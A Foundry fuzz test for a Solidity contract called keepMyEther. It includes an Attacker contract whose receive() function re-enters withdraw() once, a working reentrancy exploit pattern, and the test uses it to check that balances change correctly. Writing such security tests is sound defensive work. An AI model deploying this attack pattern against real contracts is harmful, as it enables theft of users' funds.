// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {keepMyEther} from "../src/keepMyEther.sol";

contract InvMutTest is Test {
    keepMyEther c;
    function setUp() public { c = new keepMyEther(); }

    function testFuzz_property(uint256 attackerStartBalance, uint256 depositAmount) public {
        attackerStartBalance = bound(attackerStartBalance, 1 ether, 100 ether);
        depositAmount = bound(depositAmount, 1 wei, attackerStartBalance);

        Attacker attacker = new Attacker(address(c));

        vm.deal(address(attacker), attackerStartBalance);

        uint256 before = address(c).balance;

        attacker.deposit{value: depositAmount}();

        assert(address(c).balance == before + depositAmount);

        uint256 beforeWithdraw = address(c).balance;

        attacker.triggerWithdraw();

        assertTrue(address(c).balance == beforeWithdraw - depositAmount);
    }
}

contract Attacker {
    address public target;
    bool public reentered;

    constructor(address _target) payable {
        target = _target;
        reentered = false;
    }

    function deposit() external payable {
        (bool ok, ) = target.call{value: msg.value}("");
        require(ok);
    }

    function triggerWithdraw() external {
        (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
        require(ok);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
